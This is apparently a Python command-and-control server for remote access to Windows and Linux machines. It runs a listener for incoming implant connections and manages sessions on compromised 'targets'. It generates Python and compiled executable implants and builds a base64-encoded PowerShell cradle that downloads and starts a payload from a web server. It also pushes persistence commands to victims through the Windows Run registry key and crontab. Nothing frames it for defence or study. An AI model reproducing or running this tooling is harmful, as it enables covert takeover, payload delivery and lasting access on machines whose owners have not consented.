import base64
import datetime
import os
import random
import shutil
import socket
import string
import subprocess
import threading
from _thread import *
import time
from pathlib import Path

from rich.console import Console
from rich.table import Table

host_ip = ''
host_port = 0
listener_counter = 0


def generate_plant(plant_type):
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'payloads/{random_name}.py'
    template_path = Path.cwd() / 'implant-templates' / f'{plant_type}.py'

    if not template_path.exists():
        print(f'[-] {template_path} file not found.')
        return

    shutil.copy(str(template_path), file_name)

    with open(file_name, 'r+') as f:
        content = f.read()
        new_content = content.replace('INPUT_IP_HERE', host_ip).replace('INPUT_PORT_HERE', host_port)
        f.seek(0)
        f.write(new_content)
        f.truncate()

    if Path(file_name).exists():
        print(f'[+] {file_name} saved to {Path.cwd()}/payloads/')
    else:
        print('[-] Some error occurred with generation.')


winplant = lambda: generate_plant("winplant")
linplant = lambda: generate_plant("linplant")


def exeplant():
    random_name = (''.join(random.choices(string.ascii_lowercase, k=6)))
    file_name = f'payloads/{random_name}.py'
    exe_file = f'{random_name}.exe'
    check_cwd = Path.cwd()

    generate_plant("winplant")

    if not Path(file_name).exists():
        print('[-] Some error occurred during generation')
        return

    os.chdir(check_cwd / 'payloads/')
    pyinstaller_exec = f'pyinstaller {file_name} -w --clean --onefile --distpath .'
    print(f'[+] Compiling executable {exe_file}...')
    subprocess.call(pyinstaller_exec, stderr=subprocess.DEVNULL)
    Path(f'{random_name}.spec').unlink()
    Path(f'{random_name}.py').unlink()
    shutil.rmtree('build')

    if Path(check_cwd / 'payloads/' / exe_file).exists():
        print(f'[+] {exe_file} saved to {check_cwd}/payloads/.')
    else:
        print('[-] Some error occurred during generation.')


def powershell_cradle():
    web_server_ip = input('[+] Web server host: ')
    web_server_port = input('[+] Web server port: ')
    payload_name = input('[+] Payload name: ')
    runner_file = f"{''.join(random.choices(string.ascii_lowercase, k=6))}.txt"
    randomized_exe_file = f"{''.join(random.choices(string.ascii_lowercase, k=6))}.exe"
    print(
        f'[+] Run the following command to start a web server.\npython3 -m http.server -b {web_server_ip} {web_server_port}')

    runner_cal_unecoded = f"iex (new-object new.webclient).downloadstring('http://{web_server_ip}:{web_server_port}/{runner_file}')".encode(
        'utf-16le')
    with open(runner_file, 'w') as f:
        f.write(
            f'powershell -c wget http://{web_server_ip}:{web_server_port}/{payload_name} -outfile {randomized_exe_file}; Start-Process -FilePath {randomized_exe_file}')

    b64_runner_cal = base64.b64encode(runner_cal_unecoded).decode()
    print(f'\n[+] Encoded payload\n\npowershell -e {b64_runner_cal}')

    b64_runner_cal_decoded = base64.b64decode(b64_runner_cal).decode()
    print(f'\n[+] Unencoded payload\n\n{b64_runner_cal_decoded}')


def listener_handler(host_ip, host_port):
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()
    start_new_thread(communication_handler, ())
    # t1 = threading.Thread(target=communication_handler)
    # t1.start()


def help():
    print('''
    Commands
    ---------------------------------
    Listener Commands
    ---------------------------------------------------------------------------------------
    listeners -g --generate           --> Generate Listener
    
    Session Commands
    ---------------------------------------------------------------------------------------
    sessions -l --list                --> List Sessions
    sessions -i --interact            --> Interact with Session
    sessions -k --kill <value>        --> Kill Active Session
    
    Payload Commands
    ---------------------------------------------------------------------------------------
    winplant py                       --> Windows Python Implant
    exeplant py                       --> Windows Executable Implant (Python)
    linplant py                       --> Linux Python Implant
    pshell_shell                      --> Powershell Implant
    
    Client Commands
    ---------------------------------------------------------------------------------------
    persist / pt                      --> Persist Payload (After Interacting with Session) 
    background / bg                   --> Background Session
    exit                              --> Kill Client Connection
    
    Misc Commands
    ---------------------------------------------------------------------------------------
    help / h                          --> Show Help Menu
    clear / cls                       --> Clear Screen
    ''')


def send_encoded_message(target_id, message):
    message = base64.b64encode(message.encode())
    target_id.send(message)


def recv_encoded_message(target_id):
    response = target_id.recv(1024).decode()
    response = base64.b64decode(response).decode().strip()
    return response


def target_comm_channel(target_id, targets, num):
    while True:
        message = input(f'{targets[num][3]}/{targets[num][1]}#> ')
        if len(message) == 0:
            continue
        if message == 'help':
            pass
        send_encoded_message(target_id, message)
        if message in ['exit', 'background']:
            if message == 'exit':
                targets[num][7] = 'Dead'
                target_id.close()
            break
        elif message == 'persist':
            payload_name = input('[+] Enter the name of the payload to add to autorun: ')
            if targets[num][6] == 1:
                send_encoded_message(target_id, f'cmd.exe /c copy {payload_name} C:\\Users\\Public')
                send_encoded_message(target_id,
                                     f'reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v screendoor /t REG_SZ /d C:\\Users\\Public\\{payload_name}')
                print(
                    '[+] Run this command to clean up the registry: \nreg delete HKEY_CURRENT_USER\SoftWare\Microsoft\Windows\CurrentVersion\Run /v screendoor /f')
            elif targets[num][6] == 2:
                send_encoded_message(target_id,
                                     f'echo "*/1 * * * * python3 /home/{targets[num][3]}/{payload_name}" | crontab -')
                print('[+] Run this command to clean up the crontab: \n crontab -r')
        else:
            response = recv_encoded_message(target_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                target_id.close()
                break
            print(response)


def communication_handler():
    while True:
        try:
            print("comm")
            remote_target, remote_ip = sock.accept()
            print(remote_target, remote_ip)
            username = base64.b64decode(remote_target.recv(1024).decode()).decode()
            admin = base64.b64decode(remote_target.recv(1024).decode()).decode()
            op_sys = base64.b64decode(remote_target.recv(1024).decode()).decode()

            admin_value = 'Yes' if admin == 1 or username == 'root' else 'No'
            pay_val = 1 if 'Windows' in op_sys else 2
            print(username, admin, op_sys, admin_value, pay_val)
            current_time = time.strftime("%H:%M:%S", time.localtime())
            print(current_time)
            date = datetime.date.today()
            print(date)
            time_record = f"{date.month}/{date.day}/{date.year} {current_time}"
            host_name = socket.gethostbyaddr(remote_ip[0])
            print(current_time, date, time_record, host_name)
            if host_name is not None:
                targets.append(
                    [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value, op_sys,
                     pay_val, 'Active'])
            else:
                targets.append(
                    [remote_target, remote_ip[0], time_record, username, admin_value, op_sys, pay_val, 'Active'])

            print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
        except:
            print("no")


def banner():
    print(
        '                                                                                                                                                           _..._                   ')
    print(
        '                                 _______                                                         _______                                                .-\'_..._\'\'.     .-\'\'-.     ')
    print(
        '             .                   \  ___ `\'.                                /|                .--.\  ___ `\'.                 __.....__                 .\' .\'      \'.\  .\' .-.  )    ')
    print(
        '           .\'|                    \' |--.\  \                        _     _||                |__| \' |--.\  \    .--./)  .-\'\'         \'.              / .\'            / .\'  / /     ')
    print(
        '          <  |                    | |    \  \'     .-\'\'` \'\'-.  /\    \\\\   //||        .-,.--. .--. | |    \  \'  /.\'\'\\\\  /     .-\'\'"\'-.  `.           . \'             (_/   / /      ')
    print(
        '           | |             __     | |     |  \'  .\'          \'.`\\\\  //\\\\ // ||  __    |  .-. ||  | | |     |  \'| |  | |/     /________\   \          | |                  / /       ')
    print(
        '       _   | | .\'\'\'-.   .:--.\'.   | |     |  | /              ` \`//  \\\'/  ||/\'__ \'. | |  | ||  | | |     |  | \`-\' / |                  |          | |                 / /        ')
    print(
        '     .\' |  | |/.\'\'\'. \ / |   \ |  | |     \' .\'\'                \' \|   |/   |:/`  \'. \'| |  | ||  | | |     \' .\' /("\'`  \    .-------------\'          . \'                . \'         ')
    print(
        '    .   | /|  /    | | `" __ | |  | |___.\' /\' |         .-.    |  \'        ||     | || |  \'- |  | | |___.\' /\'  \ \'---. \    \'-.____...---.           \ \'.          .  / /    _.-\') ')
    print(
        '  .\'.\'| |//| |     | |  .\'.\'\'| | /_______.\'/  .        |   |   .           ||\    / \'| |     |__|/_______.\'/    /\'""\'.\ `.             .\'             \'. `._____.-\'/.\' \'  _.\'.-\'\'  ')
    print(
        '.\'.\'.-\'  / | |     | | / /   | |_\_______|/    .       \'._.\'  /            |/\\\'..\' / | |         \\_______|/    ||     ||  `\'\'-...... -\'                 `-.______ //  /.-\'_.\'      ')
    print(
        '.\'   \_.\'  | \'.    | \'.\ \._,\ \'/               \'._         .\'             \'  `\'-\'`  |_|                       \\\'. __//                                          `/    _.\'         ')
    print(
        '           \'---\'   \'---\'`--\'  `"                   \'-....-\'`                                                    `\'---\'                                           ( _.-\'            ')


def handle_command(command, targets, sock, listener_counter, kill_flag):
    if command == 'help':
        help()
    elif command == 'exit':
        handle_exit(targets, sock, listener_counter, kill_flag)
    elif command.startswith('listeners'):
        listener_counter = handle_listener(command, listener_counter)
    elif command in ['winplant py', 'linplant py', 'exeplant']:
        handle_payload(command, listener_counter)
    elif command == 'pshell_shell':
        powershell_cradle()
    elif command.startswith('sessions'):
        handle_sessions(command, targets)
    elif command.startswith('kill'):
        handle_kill(command, targets)
    else:
        print('Invalid command, please try again.')

    return listener_counter


def handle_exit(targets, sock, listener_counter, kill_flag):
    quit_message = input('Ctrl-C\n[+] Do you really want to quit? (y/n)').lower()
    if quit_message == 'y':
        targets_length = len(targets)
        for target in targets:
            if target[7] == 'Dead':
                pass
            else:
                send_encoded_message(target[0], 'exit')
        kill_flag = 1
        if listener_counter > 0:
            sock.close()
        print('[+] You can close this window now.')
        exit()


def handle_listener(command, listener_counter):
    global host_ip, host_port
    if command.split(" ")[1] == '-g' or command.split(" ")[1] == '--generate':
        host_ip = input('[+] Enter the IP address to listen on: ')
        host_port = input('[+] Enter the port to listen on: ')
        x = threading.Thread(target=listener_handler, args=(host_ip, host_port))
        x.start()
        listener_counter += 1
        return listener_counter



def handle_payload(command, listener_counter):

    if listener_counter > 0:
        if command == 'winplant py':
            winplant()
        elif command == 'linplant py':
            linplant()
        elif command == 'exeplant':
            exeplant()
    else:
        print('[-] You cannot generate a payload without an active listener.')


def handle_sessions(command, targets):
    session_counter = 0
    if command.split(" ")[1] == '-l':
        display_sessions(targets)
    elif command.split(" ")[1] == '-i':
        handle_interactive_session(command, targets)
    elif command.split(" ")[1] == '-k' or command.split(" ")[1] == '--kill':
        handle_session_termination(command, targets)


def handle_session_termination(command, targets):
    if len(command.split(" ")) < 3:
        print('[-] A valid and active session id must be passed with --kill command')
        return
    command = "kill " + command.split(" ")[2]
    handle_kill(command, targets)


def handle_kill(command, targets):
    try:
        num = int(command.split(" ")[1])
        target_id = (targets[num])[0]
        send_encoded_message(target_id, 'exit')
        targets[num][7] = 'Dead'
        print(f'[+] Session {num} terminated.')
    except (IndexError, ValueError):
        print(f'[-] Session {num} does not exist.')


def display_sessions(targets):
    table = Table(title="Sessions")
    table.add_column("Session", justify="center", style="cyan", no_wrap=True)
    table.add_column("Status", justify="center", style="cyan", no_wrap=True)
    table.add_column("Username", justify="center", style="cyan", no_wrap=True)
    table.add_column("Admin", justify="center", style="cyan", no_wrap=True)
    table.add_column("Target", justify="center", style="cyan", no_wrap=True)
    table.add_column("OS", justify="center", style="cyan", no_wrap=True)
    table.add_column("Status", justify="center", style="cyan", no_wrap=True)
    session_counter = 0

    for target in targets:
        if target[7] == 'Active':
            table.add_row(str(session_counter), target[7], target[3], target[4], target[1], target[5],
                          target[2], style='green')
        else:
            table.add_row(str(session_counter), target[7], target[3], target[4], target[1], target[5],
                          target[2], style='red')
        session_counter += 1

    console = Console()
    console.print(table)


def handle_interactive_session(command, targets):
    try:
        if not command.split(" ")[2]:
            return
        num = int(command.split(" ")[2])
        target_id = (targets[num])[0]
        if (targets[num][7]) == 'Active':
            target_comm_channel(target_id, targets, num)
        else:
            print('[-] You cannot interact with a dead session.')
    except IndexError:
        print(f'[-] Session {num} does not exist')


if __name__ == '__main__':
    banner()
    targets = []
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    while True:
        try:
            command = input('Enter command#> ')
            listener_counter = handle_command(command, targets, sock, listener_counter, kill_flag)
        except KeyboardInterrupt:
            handle_exit(targets, sock, listener_counter, kill_flag)
